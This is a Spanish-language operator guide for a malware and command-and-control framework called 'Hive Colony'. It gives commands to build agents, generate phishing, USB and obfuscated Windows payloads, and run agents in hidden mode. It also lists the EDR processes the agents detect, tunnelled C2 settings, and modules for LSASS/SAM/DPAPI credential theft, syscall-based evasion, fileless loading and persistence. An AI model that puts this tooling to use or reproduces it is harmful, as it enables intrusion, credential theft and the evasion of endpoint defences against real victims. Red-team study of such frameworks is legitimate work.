# Operator Guide 🎮

```
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║                     HIVE COLONY OPERATOR                      ║
║                                                               ║
║   ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐       ║
║   │ BUILD   │→│ DEPLOY  │→│ EXECUTE │→│ MONITOR │       ║
║   │ cargo   │  │ scripts │  │ target  │  │ C2 API  │       ║
║   └─────────┘  └─────────┘  └─────────┘  └─────────┘       ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
```

## Índice

| Sección | Descripción |
|---------|-------------|
| [1. Prerrequisitos](#1-prerrequisitos) | Lo que necesitas instalar |
| [2. Quick Start](#2-quick-start) | Primer despliegue en 3 pasos |
| [3. Scripts](#3-scripts) | Catálogo de herramientas |
| [4. Configuración](#4-configuración) | hive.toml y variables de entorno |
| [5. Monitoreo](#5-monitoreo) | C2 API, logs, health check |
| [6. Cross-compile Windows](#6-cross-compile-windows) | Build para targets Windows |
| [7. Kill Switch](#7-kill-switch) | Apagado de emergencia |
| [8. Solución de problemas](#8-solución-de-problemas) | Errores comunes |

---

## 1. Prerrequisitos

```
┌─────────────────────────────────────────────────────────────┐
│                    SISTEMA REQUERIDO                         │
├─────────────────────────────────────────────────────────────┤
│  Rust    → 1.70+    (rustup default stable)                 │
│  OpenSSL → dev      (apt install libssl-dev pkg-config)     │
│  Python  → 3.10+    (pip install -r requirements.txt)       │
│  Kernel  → 3.17+    (para shm_open / memfd_create)          │
│  Docker  → opcional (para despliegue containerizado)        │
│  Ollama  → opcional (para LLM estratégico)                  │
│  mingw   → opcional (para cross-compile Windows)            │
└─────────────────────────────────────────────────────────────┘
```

```bash
# Debian/Ubuntu
sudo apt update && sudo apt install -y \
    build-essential pkg-config libssl-dev \
    python3 python3-pip docker.io

# Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
rustup default stable

# Windows cross-compile (opcional)
sudo apt install mingw-w64
rustup target add x86_64-pc-windows-gnu

# Python
pip install -r requirements.txt
```

---

## 2. Quick Start

```
PASO 1                           PASO 2                           PASO 3
╔═══════════════════╗    ╔═══════════════════════╗    ╔══════════════════════╗
║                   ║    ║                       ║    ║                      ║
║  cargo build      ║    ║  ./scripts/deploy.sh  ║    ║  ./scripts/          ║
║  --release        ║───▶║  all                  ║───▶║  launch_colony.sh   ║
║  --workspace      ║    ║                       ║    ║                      ║
║                   ║    ║  payloads/listos/     ║    ║  Colonia corriendo!  ║
╚═══════════════════╝    ╚═══════════════════════╝    ╚══════════════════════╝
```

```bash
# Paso 1: Compilar todo
cargo build --release --workspace

# Paso 2: Generar payloads (4 vectores)
./scripts/deploy.sh all

# Paso 3: Desplegar localmente
./scripts/launch_colony.sh

# Verificar
curl http://localhost:8444/health
```

---

## 3. Scripts

```
scripts/
│
├── deploy.sh          ◀── Generador de payloads
│                        network | usb | phishing | exe
│                        Flags: --windows, --obfuscate, --c2-host
│
├── build_payload.sh   ◀── Stager monolítico auto-extraíble
│                        Un solo script con todo embebido
│
├── launch_colony.sh   ◀── Despliegue local Docker
│                        Lanza C2 + 6 agentes + dashboard
│
├── obfuscate_pe.py    ◀── PE obfuscator v2.2
│                        8 técnicas polimórficas
│
└── scenario.sh        ◀── Tests de escenarios
                         Validación de comportamiento
```

### deploy.sh — Flags

| Flag | Default | Descripción |
|------|---------|-------------|
| `--windows` | off | Genera payloads Windows (.exe) |
| `--obfuscate` | off | Aplica PE obfuscation (requiere --windows) |
| `--c2-host HOST` | `your-c2.com` | Hostname/IP del C2 |
| `--c2-port PORT` | `8444` | Puerto del C2 |

### build_payload.sh — Flags

| Flag | Default | Descripción |
|------|---------|-------------|
| `--windows` | off | Stager para Windows |
| `--obfuscate` | off | PE obfuscation en bins embebidos |
| `--output FILE` | `hive_payload.sh` | Nombre del archivo generado |
| `--c2-host HOST` | `your-c2.com` | C2 hostname |
| `--c2-port PORT` | `8444` | C2 port |
| `--no-compress` | off | Sin compresión GZip |

### obfuscate_pe.py — Flags

| Flag | Descripción |
|------|-------------|
| `-o OUTPUT` | Archivo de salida |
| `--quiet` | Solo imprime SHA256 |
| `--no-rename` | Desactiva sección renaming |
| `--no-rich` | Desactiva Rich header scrub |
| `--no-debug` | Desactiva debug directory kill |
| `--no-overlay` | Desactiva overlay entrópico |
| `--no-dummies` | Desactiva dummy sections |
| `--no-cert` | Desactiva cert injection |
| `--no-entropy` | Desactiva entropy normalization |
| `--no-checksum` | Desactiva fix checksum |
| `--cert-path PATH` | Ruta al certificado PKCS#7 |

---

## 4. Configuración

### hive.toml

```toml
[c2]
url = "https://tu-c2.com:8444/collect"
api_key = "supersecreto"

[agents]
edr_processes = [
    "csfalcon",       # CrowdStrike
    "csagent",        # CrowdStrike
    "msmpeng",        # Microsoft Defender
    "sentinelone",    # SentinelOne
    "carbonblack",    # VMware Carbon Black
    "cylancesvc",     # Cylance
    "symantec",       # Symantec
    "mcafee",         # McAfee
    "sesvc",          # Sophos
    "taniumclient",   # Tanium
    "elastic-endpoint", # Elastic
]

[exploits]
safe_mode = true
operator_approved = false
target_whitelist = ["10.0.0.0/8", "192.168.0.0/16"]

[consensus]
threshold = 0.66
```

### Variables de entorno

| Variable | Default | Propósito |
|----------|---------|-----------|
| `__HIVE_ARENA` | `/dev/shm/hive_arena` | Ruta del archivo de arena IPC |
| `HIVE_C2_URL` | `https://c2:8444/collect` | Endpoint HTTP C2 |
| `HIVE_C2_DNS_DOMAIN` | `tunnel.example.com` | Dominio para DNS tunnel |
| `HIVE_C2_ICMP_TARGET` | `8.8.8.8` | Target para ICMP tunnel |
| `HIVE_LAB_MODE` | `0` | Modo laboratorio (1=simulado) |
| `HIVE_TELEMETRY_DIR` | `/tmp/hive_telemetry` | Directorio de telemetría |
| `HIVE_EXEC_TIMEOUT` | `30` | Timeout para comandos (s) |
| `RUST_LOG` | `info` | Nivel de logging |
| `HIVE_HIDE` | — | Modo oculto (sin stdout) |

---

## 5. Monitoreo

```
┌─────────────────────────────────────────────────────────────────┐
│                        MONITOREO                                │
│                                                                 │
│  ┌───────────┐    ┌────────────┐    ┌────────────────────┐     │
│  │ C2 API    │───▶│ Health     │───▶│ curl               │     │
│  │ :8444     │    │ Check      │    │ /health → {"ok"}   │     │
│  └───────────┘    └────────────┘    └────────────────────┘     │
│                                                                 │
│  ┌───────────┐    ┌────────────┐    ┌────────────────────┐     │
│  │ Logs      │───▶│ File       │───▶│ tail -f            │     │
│  │ ocultos   │    │ /tmp/      │    │ /tmp/hive_queen.log│     │
│  └───────────┘    │ hive_*.log │    └────────────────────┘     │
│                   └────────────┘                                │
│  ┌───────────┐    ┌────────────┐    ┌────────────────────┐     │
│  │ Dashboard │───▶│ Web UI     │───▶│ http://localhost:   │     │
│  │ (Docker)  │    │ :8080      │    │ 8080               │     │
│  └───────────┘    └────────────┘    └────────────────────┘     │
└─────────────────────────────────────────────────────────────────┘
```

### Health check

```bash
# C2 server vivo?
curl http://localhost:8444/health
# → {"status":"ok","agents":6,"uptime":12345}
```

### Logs de agente

```bash
# Modo normal: stdout
# Modo oculto (--hide / --silent): archivo
tail -f /tmp/hive_queen.log
tail -f /tmp/hive_worker.log
tail -f /tmp/hive_honeybee.log
```

### Modo oculto

Los agentes soportan `--hide` o `--silent` para suprimir toda salida a terminal:

```bash
# Sin output visible
./target/release/queen --hide

# Los logs van a /tmp/hive_queen.log
# stdout/stderr redirigidos a /dev/null via dup2()
```

### Ver procesos

```bash
ps aux | grep -E 'queen|worker|drone|honeybee|weaver|swarm'

# o
pgrep -a queen
pgrep -a worker
```

---

## 6. Cross-compile Windows

```
┌─────────────────────────────────────────────────────────────────┐
│          CROSS-COMPILE: LINUX → WINDOWS x86_64                  │
│                                                                 │
│  cargo build \                                                  │
│    --release \                                                  │
│    --target x86_64-pc-windows-gnu \                             │
│    -p queen                                                     │
│                                                                 │
│  target/x86_64-pc-windows-gnu/release/queen.exe  ◀── .exe listo │
└─────────────────────────────────────────────────────────────────┘
```

```bash
# 1. Instalar toolchain (una vez)
./setup_cross.sh win
#   → apt install mingw-w64
#   → rustup target add x86_64-pc-windows-gnu

# 2. Compilar queen
cargo build --release --target x86_64-pc-windows-gnu -p queen

# 3. Compilar todos los agentes
for p in queen worker drone honeybee weaver swarm c2-server; do
    cargo build --release --target x86_64-pc-windows-gnu -p "$p"
done

# 4. Generar payload Windows con ofuscación
./scripts/deploy.sh exe --windows --obfuscate --c2-host tu-c2.com

# Output: payloads/executable/
# ├── loader.cs         C# loader
# ├── queen.b64         Queen cifrado
# ├── compile.sh        Compilación Linux
# └── compile.bat       Compilación Windows
```

### Módulos Windows disponibles

| Módulo | Archivo | Capacidad |
|--------|---------|-----------|
| Syscalls | `syscalls.rs` | Hell's Gate + Halo's Gate + Hades Gate |
| Stack spoof | `stack_spoof.rs` | Ret-spoofing + RBP chain sintética |
| Fileless | `fileless.rs` | NtCreateSection + NtMapViewOfSection |
| Credentials | `leech.rs` | LSASS (syscalls), SAM, DPAPI |
| Anti-analysis | `anti_analysis.rs` | PEB BeingDebugged, sandbox detection |
| EDR detection | `system_info.rs` | 30+ firmas (Defender, CrowdStrike...) |
| Persistence | `phoenix.rs` | Registry Run, Startup, SchTasks, WMI |

---

## 7. Kill Switch

```
┌─────────────────────────────────────────────────────────────────┐
│                    EMERGENCY KILL SWITCH                        │
│                                                                 │
│  POST /beacon {"action":"kill_switch"}                          │
│         │                                                       │
│         ▼                                                       │
│  ┌──────────────────┐                                          │
│  │ C2 Server        │                                          │
│  │ └── broadcast    │────────────────▶ Todos los agentes       │
│  │     kill_switch  │                  se autodestruyen        │
│  └──────────────────┘                  en ≤5 segundos          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

```bash
# Vía API
curl -X POST http://localhost:8444/beacon \
  -H "Content-Type: application/json" \
  -d '{"action":"kill_switch"}'

# Vía dashboard (si está corriendo)
# Botón "Kill Switch" en http://localhost:8080

# O manualmente
pkill -9 queen worker drone honeybee weaver swarm c2-server
rm -rf /tmp/.hive /tmp/.h /dev/shm/hive_arena
```

---

## 8. Solución de problemas

| Problema | Causa probable | Solución |
|----------|---------------|----------|
| `cargo build` falla | Falta OpenSSL | `apt install libssl-dev pkg-config` |
| `cargo build --target windows` falla | Falta mingw | `./setup_cross.sh win` |
| `deploy.sh` no encuentra bins | No compilaste | `cargo build --release --workspace` |
| `--obfuscate` no funciona | Falta `--windows` | Usar `--windows --obfuscate` |
| Cert injection falla | No estás en WSL | El cert se extrae de ntdll.dll en WSL |
| Agente no conecta al C2 | Firewall | Verificar puerto 8444 accesible |
| Logs de agente vacíos | Modo oculto | `tail -f /tmp/hive_<agent>.log` |
| Queen no lanza agentes | Arena no disponible | `ls -la /dev/shm/hive_arena` |
| Docker no arranca | Puerto ocupado | `netstat -tlnp \| grep 8444` |

### Debug mode

```bash
# Compilar con debug symbols
cargo build -p queen

# Ejecutar con RUST_LOG=trace para máximo detalle
RUST_LOG=trace ./target/debug/queen

# Sin modo oculto (ver todo en terminal)
./target/debug/queen
```

---

## Referencias rápidas

### Lo que más vas a usar

```bash
# Compilar
cargo build --release --workspace

# Generar payload USB
./scripts/deploy.sh usb

# Generar EXE Windows ofuscado
./scripts/deploy.sh exe --windows --obfuscate

# Stager monolítico
./scripts/build_payload.sh

# Despliegue local
./scripts/launch_colony.sh
```

### Documentación relacionada

| Documento | Contenido |
|-----------|-----------|
| [DEPLOYMENT.md](DEPLOYMENT.md) | Guía detallada de todos los vectores |
| [AGENTS.md](AGENTS.md) | Referencia de cada agente |
| [PLAYBOOK.md](PLAYBOOK.md) | Playbook operativo completo |
| [EVASION.md](EVASION.md) | Técnicas de evasión implementadas |
| [MITRE_MAPPING.md](MITRE_MAPPING.md) | Mapeo MITRE ATT&CK |
